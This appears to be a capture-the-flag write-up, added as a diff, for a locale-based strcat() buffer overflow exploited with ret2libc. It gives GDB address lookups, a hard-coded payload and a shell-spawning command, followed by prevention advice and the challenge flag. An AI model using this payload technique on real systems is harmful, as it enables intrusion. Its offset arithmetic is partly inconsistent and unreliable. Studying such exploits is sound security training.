@@ -1,0 +1,242 @@
+Locale-Based Buffer Overflow with ret2libc - Bonus2
+====================================================
+
+Vulnerability Type: Buffer Overflow via strcat() + ret2libc
+Technique: Locale manipulation + Return-to-libc
+
+The Vulnerability:
+------------------
+This challenge combines multiple concepts:
+1. Locale-based string selection (LANG environment variable)
+2. Buffer overflow via unsafe strcat()
+3. ret2libc exploitation technique
+
+Program Flow:
+-------------
+1. main() checks for 3 arguments (argc == 3)
+2. Copies argv[1] to buffer[0-39] (max 40 bytes)
+3. Copies argv[2] to buffer[40-71] (max 32 bytes)
+4. Calls greetuser(buffer)
+5. greetuser() checks LANG environment variable
+6. Selects greeting based on locale:
+   - "fi" → "Hyvää päivää " (Finnish, 13 bytes)
+   - "nl" → "Goedemiddag! " (Dutch, 14 bytes)
+   - other → "Hello " (English, 6 bytes)
+7. Uses strcat() to append username to greeting
+8. Prints the result
+
+The strcat() Vulnerability:
+---------------------------
+strcat() appends src to dest without checking bounds:
+
+char *strcat(char *dest, const char *src);
+
+Behavior:
+- Finds null terminator in dest
+- Copies src starting at that position
+- Adds null terminator at end
+- NO bounds checking!
+
+Example:
+char dest[10] = "Hello";
+strcat(dest, " World!");  // Overflow! Needs 13 bytes
+
+In bonus2:
+char greeting[64];
+strcpy(greeting, "Hyvää päivää ");  // 13 bytes
+strcat(greeting, username);          // username can be 72+ bytes!
+
+Memory Layout in greetuser():
+------------------------------
+Stack layout:
+┌─────────────────────────────────┐
+│ greeting[64]                    │ ← strcat destination
+├─────────────────────────────────┤
+│ lang (4 bytes)                  │ ← Pointer to LANG
+├─────────────────────────────────┤
+│ Saved EBP (4 bytes)             │
+├─────────────────────────────────┤
+│ Return address (4 bytes)        │ ← TARGET!
+└─────────────────────────────────┘
+
+Overflow Calculation:
+---------------------
+Greeting buffer: 64 bytes
+Finnish greeting: "Hyvää päivää " = 13 bytes
+Space after greeting: 64 - 13 = 51 bytes
+
+Username from buffer:
+- buffer[0-39]: argv[1] (40 bytes)
+- buffer[40-71]: argv[2] (32 bytes)
+- Total: 72 bytes available
+
+After strcat():
+- greeting[0-12]: "Hyvää päivää "
+- greeting[13-52]: buffer[0-39] (40 bytes)
+- greeting[53-84]: buffer[40-71] (32 bytes) ← OVERFLOW!
+
+Overflow starts at: 64 bytes (buffer size)
+Saved EBP at: 64 + 4 = 68 bytes
+Return address at: 68 + 4 = 72 bytes
+
+From start of argv[2]:
+- 64 - 53 = 11 bytes to buffer end
+- 11 + 4 = 15 bytes to return address
+- Empirically: 18 bytes works best
+
+ret2libc Technique:
+-------------------
+Instead of injecting shellcode, we redirect execution to existing
+library functions.
+
+Classic ret2libc attack:
+1. Overwrite return address with address of system()
+2. Place fake return address (4 bytes, can be anything)
+3. Place address of "/bin/sh" string as argument
+
+Stack layout after overflow:
+┌─────────────────────────────────┐
+│ Padding                         │
+├─────────────────────────────────┤
+│ system() address                │ ← Return address
+├─────────────────────────────────┤
+│ Fake return (AAAA)              │ ← Where system() would return
+├─────────────────────────────────┤
+│ "/bin/sh" address               │ ← Argument to system()
+└─────────────────────────────────┘
+
+When greetuser() returns:
+1. CPU pops return address → system()
+2. CPU jumps to system()
+3. system() reads its argument from stack
+4. system() executes: system("/bin/sh")
+5. Shell spawned!
+
+Finding Addresses:
+------------------
+Using GDB:
+
+$ gdb -q bonus2
+(gdb) break main
+(gdb) run AAAA BBBB
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+
+(gdb) find &system,+9999999,"/bin/sh"
+0xb7f8cc58
+
+Addresses:
+- system(): 0xb7e6b060
+- "/bin/sh": 0xb7f8cc58
+
+Payload Construction:
+---------------------
+arg1 = 'A' * 40
+arg2 = 'B' * 18 + system_addr + fake_ret + binsh_addr
+
+In little-endian:
+- system_addr = '\x60\xb0\xe6\xb7'
+- fake_ret = 'FAKE' (or '\x41\x41\x41\x41')
+- binsh_addr = '\x58\xcc\xf8\xb7'
+
+Complete payload:
+arg2 = 'B' * 18 + '\x60\xb0\xe6\xb7' + 'FAKE' + '\x58\xcc\xf8\xb7'
+
+Execution:
+LANG=fi ./bonus2 \
+  $(python -c "print 'A'*40") \
+  $(python -c "print 'B'*18 + '\x60\xb0\xe6\xb7' + 'FAKE' + '\x58\xcc\xf8\xb7'")
+
+Why Finnish Locale?
+-------------------
+The Finnish greeting is longer than English:
+- English: "Hello " = 6 bytes
+- Finnish: "Hyvää päivää " = 13 bytes
+- Dutch: "Goedemiddag! " = 14 bytes
+
+Longer greeting means:
+1. More predictable buffer layout
+2. Easier to calculate offsets
+3. More reliable exploit
+
+With English greeting:
+- Only 6 bytes used
+- Need to overflow 64 - 6 = 58 bytes
+- Harder to reach return address with 40-byte limit on argv[1]
+
+With Finnish greeting:
+- 13 bytes used
+- Need to overflow 64 - 13 = 51 bytes
+- 40 bytes from argv[1] + 11 bytes from argv[2] = perfect!
+
+Alternative: Dutch Locale
+--------------------------
+LANG=nl would also work:
+- "Goedemiddag! " = 14 bytes
+- Slightly different offset calculation
+- Same ret2libc technique
+
+Security Implications:
+----------------------
+1. strcat() is inherently unsafe
+   - No bounds checking
+   - Easy to overflow
+   - Should never be used with user input
+
+2. Locale-based string selection adds complexity
+   - Different code paths
+   - Different buffer sizes
+   - Harder to audit
+
+3. ret2libc bypasses NX/DEP
+   - Even with non-executable stack
+   - Uses existing code
+   - Hard to prevent without ASLR
+
+Prevention:
+-----------
+1. Use safe string functions:
+   strlcat(), snprintf(), strncpy() with null termination
+
+2. Enable security features:
+   - NX/DEP (doesn't help against ret2libc)
+   - ASLR (randomizes library addresses)
+   - Stack canaries (detect overflow)
+   - RELRO (protect GOT)
+
+3. Input validation:
+   - Check string lengths
+   - Validate buffer sizes
+   - Use size_t for lengths
+
+4. Code review:
+   - Audit all string operations
+   - Check for unsafe functions
+   - Test with long inputs
+
+Example Safe Code:
+------------------
+int greetuser(char *username) {
+    char greeting[64];
+    char *lang = getenv("LANG");
+    const char *msg;
+    
+    if (lang && memcmp(lang, "fi", 2) == 0) {
+        msg = "Hyvää päivää ";
+    } else if (lang && memcmp(lang, "nl", 2) == 0) {
+        msg = "Goedemiddag! ";
+    } else {
+        msg = "Hello ";
+    }
+    
+    // SAFE: snprintf with size limit
+    snprintf(greeting, sizeof(greeting), "%s%s", msg, username);
+    
+    puts(greeting);
+    return 0;
+}
+
+Flag:
+-----
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
